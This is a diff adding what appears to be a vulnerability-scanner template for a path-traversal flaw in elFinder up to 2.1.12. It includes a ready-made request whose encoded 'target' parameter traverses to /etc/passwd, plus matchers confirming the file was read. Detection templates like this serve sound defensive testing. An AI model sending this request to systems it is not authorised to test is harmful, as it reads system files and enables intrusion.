@@ -1,0 +1,30 @@
+id: "elfinder-path-traversal"
+name: "elFinder  <=2.1.12 - Local File Inclusion"
+severity: "high"
+description: "elFinder through 2.1.12 is vulnerable to local file inclusion via Connector.minimal.php in std42. This allows unauthenticated remote attackers to read, write, and browse files outside the configured document root. This is due to improper handling of absolute file paths."
+tech:
+  - "php"
+tags:
+  - "lfi"
+  - "elfinder"
+  - "vuln"
+cwe: "CWE-22"
+reference: "https://www.synacktiv.com/publications/elfinder-the-story-of-a-repwning.html"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/php/connector.minimal.php?cmd=file&target=l1_Li8vLi4vLy4uLy8uLi8vLi4vLy4uLy8uLi9ldGMvcGFzc3dk&download=1"
+  headers:
+    "Content-Type": "application/x-www-form-urlencoded"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "regex"
+    part: "body"
+    regex:
+      - "root:.*:0:0:"
+  - type: "status"
+    status:
+      - 200
